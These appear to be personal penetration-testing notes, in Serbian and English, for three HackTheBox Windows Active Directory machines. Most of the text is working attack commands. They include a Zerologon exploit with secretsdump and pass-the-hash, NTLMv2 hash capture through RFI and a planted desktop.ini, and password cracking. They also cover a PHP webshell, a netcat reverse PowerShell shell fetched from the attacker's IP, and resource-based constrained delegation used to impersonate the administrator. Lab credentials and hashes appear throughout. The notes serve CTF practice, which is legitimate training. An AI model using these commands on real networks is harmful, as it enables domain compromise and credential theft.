**********************************************************Outdated********************************************************
windows, ldap, smb, zerologon, exercise great! , impacket
nmap -sS -sV -sC 10.10.11.175

smbclient -L 10.10.11.175
smbclient \\\\10.10.11.175\\Shares

https://github.com/risksense/zerologon
python3 set_empty_pw DC_NETBIOS_NAME DC_IP_ADDR
python3 set_empty_pw.py dc 10.10.11.175

posto je lozinka uklonjena mozda da izbacimo hashs uz pomoc secretsdump
impacket-secretsdump -just-dc -no-pass 'DC$@10.10.11.175'

impacket-wmiexec WORKGROUP/Administrator@10.10.11.175 -hashes :716f1ce2e2cf38ee1210cce35eb78cb6

***********************************************************Flight***********************************************************
windows, Active Directory - AD, 

nmap -sS -sC -sV 10.10.11.
sudo nano /etc/hosts - ubaci adresu
curl -s 10.10.11.187 | html2text | tail -n3
gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt  -u flight.htb -t 100
found: school.flight.htb
wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/common.txt -u "http://school.flight.htb/index.php?FUZZ=index.php" -t 100 --hh 3996
probamo stranicu - http://school.flight.htb/index.php?view=index.php - dobijamo putanju za localhost

umesto da pokusamo na lokalnoj masini, mozemo pokusati RFI SMB uslugu na nasoj masini, tako da ce usluga auth i pokazati nam ntlmv2 hash

https://0bfxgh0st.github.io/hackthebox-starting-point/writeups/responder.html

sudo impacket-smbserver parrotsec . -smb2support
curl -s "http://school.flight.htb/?view=//MYIPADDRESS/parrotsec" &>/dev/null
dobijamo hash 176b943ade0d46da790da35adfb96b54
hash file - stavimo sve od svc_apache .... 
john -w:/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt hash   --> S@Ss!K@*

https://github.com/Porchetta-Industries/CrackMapExec/wiki/Installation

Proveravamo kredencijale:
crackmapexec smb 10.10.11.187 -u svc_apache -p 'S@Ss!K@*t13'
crackmapexec smb 10.10.11.187 -u svc_apache -p 'S@Ss!K@*t13' --users
Proveravamo dal jos neki korisnik koristi istu sifru:
crackmapexec smb 10.10.11.187 -u users -p 'S@Ss!K@*t13' --continue-on-success
crackmapexec smb 10.10.11.187 -u S.Moon -p 'S@Ss!K@*t13' --shares

smbclient //10.10.11.187/Shared -U S.Moon --password 'S@Ss!K@*t13'

Креирамо злонамерну датотеку која указује на наш ресурс као икону, ако неко уђе у фасциклу да би је надгледао покушаће да учита икону и приликом аутентификације ће нам дати хеш нтмлв2
Можемо користити десктоп.ини са следећом структуром
1.nasa masina desktop.ini se kreira:
[.ShellClassInfo]
IconResource=\\10.10.14.10\parrotsec\
2.sudo impacket-smbserver parrotsec . -smb2support
3.smb: \> put desktop.ini
После неколико тренутака покушаће да учита ресурс и добићемо хеш нтмлв2!!!

john -w:/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt hash2 - Tikkycoll_431012284  c.bum

crackmapexec smb 10.10.11.187 -u C.Bum -p Tikkycoll_431012284 --shares
smbclient //10.10.11.187/Web -U C.Bum --password Tikkycoll_431012284

cd flight.htb
https://github.com/WhiteWinterWolf/wwwolf-php-webshell  --> put wehshell.php
got to: flight.htb/webshell.php

cmd - whoami
mkdir C:\Gato
curl 10.10.14.6/netcat.exe -o C:\Gato\netcat.exe
C:\Gato\netcat.exe -e powershell 10.10.14.6 443

*********************************************************SUPPORT***********************************************************
windows, AD, ldap,smbclient,dnspy(reverse enginnering)
nmap -sV -sS -sC 10.10.11.174
smbclient -L 10.10.11.174 -N
smbclient //10.10.11.174/support-tools -N
    dir ; get UserInfo.exe.zip ; exit
sudo apt-get install p7zip-full
7z l UserInfo.exe.zip

https://github.com/dnSpy/dnSpy - > NET assembly editor
    find Protected.enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"

        ❯ python3
    Python 3.10.0 on linux
    >>> enc_password = b"0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"
    >>> key = b"armando"
    >>> import base64
    >>> array = base64.b64decode(enc_password)
    >>> array2 = []
    >>> for i in range(len(array)):
    ...     array2.append(chr(array[i] ^ key[i % len(key)] ^ 223))
    >>> print("".join(array2))
    nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz

ldapsearch -D support\\ldap -H ldap://10.10.11.174 -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b 'CN=Users,DC=support,DC=htb' | grep 
info:
ldapsearch -D support\\ldap -H ldap://10.10.11.174 -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b 'CN=Users,DC=support,DC=htb' | grep name: | sed 's/^name: //' | grep -vE 'D|C|A|U' > users.txt

crackmapexec winrm 10.10.11.174 -u users.txt -p Ironside47pleasure40Watchful
evil-winrm -i 10.10.11.174 -u support -p Ironside47pleasure40Watchful  ----> BOOM!!!


na onsovu ovoga vidimo ranjivost: https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution
1.https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1
2.https://github.com/Kevin-Robertson/Powermad/blob/master/Powermad.ps1

NASA MASINA: python3 -m http.server 8080

TARGET SERVER
PS C:\ProgramData> curl 10.10.14.10:8080/Powermad.ps1 -o Powermad.ps1
PS C:\ProgramData> curl 10.10.14.10:8080/PowerView.ps1 -o PowerView.ps1

Na target serveru
PS C:\ProgramData> curl 10.10.14.10/Powermad.ps1 -o Powermad.ps1
PS C:\ProgramData> curl 10.10.14.10/PowerView.ps1 -o PowerView.ps1
PS C:\ProgramData> Import-Module .\Powermad.ps1
PS C:\ProgramData> Import-Module .\PowerView.ps1

Pocinjemo kreiranjem naloga s imenom fake01 i password 123456:
PS C:\ProgramData> New-MachineAccount -MachineAccount fake01 -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

Get-DomainComputer fake01 -Properties objectsid

C:\ProgramData> $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-1677581083-3380853377-188903654-5601 -> ovde moze da bude drugi broj ispratit prethodnu komandu)"
PS C:\ProgramData> $SDBytes = New-Object byte[] ($SD.BinaryLength)
PS C:\ProgramData> $SD.GetBinaryForm($SDBytes, 0)
PS C:\ProgramData> 

NASA masina:
(dodati u /etc/hosts dc.support.htb support.htb)
impacket-getST support.htb/fake01:123456 -dc-ip 10.10.11.174 -impersonate administrator -spn www/dc.support.htb
export KRB5CCNAME=administrator.ccache
impacket-wmiexec support.htb/administrator@dc.support.htb -no-pass -k   --> BOOM!!!!!!!!!
whoami !!!
